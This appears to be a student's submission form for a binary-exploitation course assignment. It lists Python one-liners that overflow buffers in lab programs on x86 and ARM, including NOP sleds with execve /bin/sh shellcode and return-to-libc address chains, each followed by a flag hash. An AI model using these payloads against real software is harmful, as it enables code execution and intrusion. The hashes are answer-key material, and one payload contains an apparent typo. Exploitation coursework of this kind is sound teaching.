# Submission form

Name: James Wei
NetID: jaw160230

## x86

### Part 0
Hash
5ce9894ec2edb00aeca78769a904eec3

### Part 1

* Input 

python -c 'print b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + b"\xcb\x85\x04\x08"' | ./part0x01

* Hash

231fc66d3993582eb4b56788c1f2ee15

### Part 2

* Input

python -c 'print b"A" * 32 + b"\x50\xc5\xff\xff" + b"\x90" * 100 + b"\x32\xc0\x50\x68\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' > tmp/JamesInput

* Hash

1c1043b699e49e89c7faafd93efb8ccd

###  Part 3

* Input

python -c 'print b"\x11" * 32 + b"\c50\xa2\xe1\xf7" + b"\x90\x90\x90\x90" + b"\xcf\xb3\xf5\xf7" + b"\x20\xd4\xe0\xf7"' > /tmp/JamesInput

* Hash

71d885f37d30dbc2ebf1de9c374d540f

## ARM 

### Part 0

Hash
7343273d91f977f10b6927709ddffb8e

### Part 1
* Input

python -c 'print b"AAAABBBBCCCCDDDDEEEEFFFF" + b"\xa0\x05\x01\x00"' | ./part0x01


* Hash

8334e4cda54f0631bf730c02ed49d130

<hash from /home/assign0x2-p1/solve>

###  Part 2


* Input

python -c 'print b"\x11" * 24 + b"\x1c\xe5\xff\xbe" + b"\xe1\xa0\x10\x01" * 60 + b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x2d\x1c\x2f\x62\x69\x6e\x2f\x73\x68\x58"' > /tmp/JamesInput

* Hash

4f1c7f73637a4f3d09c3258529bacf2b

### Part 3

* Input

python -c 'print b"\x22" * 24 + b"\xfc\x81\xeb\xb6" + b"\x6c\xab\xf6\xb6" + b"BUFF" + b"\xc8\x79\x37\xb6"' > tmp/JamesInput

* Hash

65f8e63a7a834467209678c2131b63b9


